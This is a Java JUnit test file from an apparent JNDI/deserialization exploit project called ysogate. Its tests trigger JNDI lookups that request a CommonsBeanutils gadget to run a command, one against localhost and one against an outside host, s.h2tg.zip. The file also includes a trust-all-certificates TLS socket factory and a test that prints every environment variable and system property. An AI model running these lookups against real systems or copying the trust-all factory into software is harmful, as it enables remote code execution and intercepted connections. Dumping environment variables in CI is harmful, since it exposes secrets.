package com.h2tg.ysogate;

import org.junit.Test;

import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;
import javax.net.SocketFactory;
import javax.net.ssl.*;
import java.io.IOException;
import java.net.InetAddress;
import java.net.Socket;
import java.security.cert.X509Certificate;
import java.util.Hashtable;

public class CiTest {
    @Test
    public void test() {
        System.out.println("System.getProperties(): " + System.getProperties());
        System.out.println("System.getenv(): " + System.getenv());
    }

    /**
     * 测试 LDAP 明文连接
     */
    @Test
    public void ldap() throws NamingException {
        String gadget = "CommonsBeanutils2183NOCC";
        Context ctx = new InitialContext();
        Object result = ctx.lookup("ldap://127.0.0.1:1389/Deserialize/" + gadget + "/Command/calc");
    }

    /**
     * 测试 LDAPS (SSL/TLS) 连接
     * 需要先启动 JNDI 服务: java -jar ysogate.jar -m jndi
     */
    @Test
    public void ldaps() throws NamingException {
        String gadget = "CommonsBeanutils2183NOCC";

        Hashtable<String, String> env = new Hashtable<>();
//        env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.ldap.LdapCtxFactory");
//        env.put(Context.PROVIDER_URL, "ldaps://127.0.0.1:1636");
//        env.put(Context.SECURITY_PROTOCOL, "ssl");
//        // 使用信任所有证书的 SSLSocketFactory (因为服务端使用自签名证书)
//        env.put("java.naming.ldap.factory.socket", TrustAllSSLSocketFactory.class.getName());

        Context ctx = new InitialContext(env);
        Object result = ctx.lookup("ldaps://s.h2tg.zip:1636/Deserialize/" + gadget + "/Command/calc");
    }

    /**
     * 信任所有证书的 SSLSocketFactory
     * 用于连接使用自签名证书的 LDAPS 服务
     */
    public static class TrustAllSSLSocketFactory extends SocketFactory {
        private final SSLSocketFactory delegate;

        public TrustAllSSLSocketFactory() {
            try {
                TrustManager[] trustAllCerts = new TrustManager[]{
                        new X509TrustManager() {
                            public X509Certificate[] getAcceptedIssuers() { return new X509Certificate[0]; }
                            public void checkClientTrusted(X509Certificate[] certs, String authType) { }
                            public void checkServerTrusted(X509Certificate[] certs, String authType) { }
                        }
                };
                SSLContext sc = SSLContext.getInstance("TLS");
                sc.init(null, trustAllCerts, new java.security.SecureRandom());
                this.delegate = sc.getSocketFactory();
            } catch (Exception e) {
                throw new RuntimeException(e);
            }
        }

        /**
         * JNDI 框架通过此静态方法获取 SocketFactory 实例
         */
        public static SocketFactory getDefault() {
            return new TrustAllSSLSocketFactory();
        }

        @Override
        public Socket createSocket(String host, int port) throws IOException {
            return delegate.createSocket(host, port);
        }

        @Override
        public Socket createSocket(String host, int port, InetAddress localHost, int localPort) throws IOException {
            return delegate.createSocket(host, port, localHost, localPort);
        }

        @Override
        public Socket createSocket(InetAddress host, int port) throws IOException {
            return delegate.createSocket(host, port);
        }

        @Override
        public Socket createSocket(InetAddress address, int port, InetAddress localAddress, int localPort) throws IOException {
            return delegate.createSocket(address, port, localAddress, localPort);
        }

        @Override
        public Socket createSocket() throws IOException {
            return delegate.createSocket();
        }
    }
}
